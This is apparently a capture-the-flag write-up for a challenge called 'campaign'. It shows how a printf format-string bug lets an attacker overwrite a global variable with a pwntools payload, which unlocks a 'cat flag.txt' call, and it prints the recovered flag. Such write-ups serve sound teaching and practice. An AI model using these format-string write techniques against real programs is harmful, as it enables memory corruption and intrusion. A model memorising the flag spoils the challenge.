# campaign

The vulnerability is the obvious format string:

```c
printf("Name: ");
printf(name);
```

The program later checks a writable global variable:

```c
char type[] = "ai";

if (strcmp(type, "human") == 0) {
  printf("Congratulations! You can get the VIP membership!\n");
  system("cat flag.txt");
}
```

So we do not need code execution. We only need to overwrite `type` from `"ai"` to `"human"`.

Because the binary is not PIE, `type` has a fixed address:

```text
0x404050
```

This fits nicely in the 8-byte slot reserved for the global:

```text
68 75 6d 61 6e 00
h  u  m  a  n \0
```

The only constraint is the `fgets(name, 0x60, stdin)` size limit, so the payload must stay under 96 bytes.

Leaking stack positions with `%p` on the remote service shows that the first qword of the `name` buffer is reachable as `%8$p`:

```text
AAAABBBB.%1$p.%2$p....%8$p
                      ^
                      0x4242424241414141
```

So a compact solution is to write the string in three parts:

- `type+2 <- 0x616d` to write `"ma"`
- `type+4 <- 0x6e` to write `"n"`
- `type+0 <- 0x7568` to write `"hu"`

Pwntools generates a 56-byte payload for that:

```py
fmtstr_payload(
    8,
    {
        type_addr + 2: p16(0x616D),
        type_addr + 4: p8(0x6E),
        type_addr + 0: p16(0x7568),
    },
    write_size="short",
)
```

After the overwrite, `strcmp(type, "human") == 0` succeeds and the program runs `cat flag.txt`.

Against the remote service, this returned:

```text
CPCTF{b3_c4r3fu1_0f_ph15h1ng_m3s54g3s}
```

Flag:

```text
CPCTF{b3_c4r3fu1_0f_ph15h1ng_m3s54g3s}
```
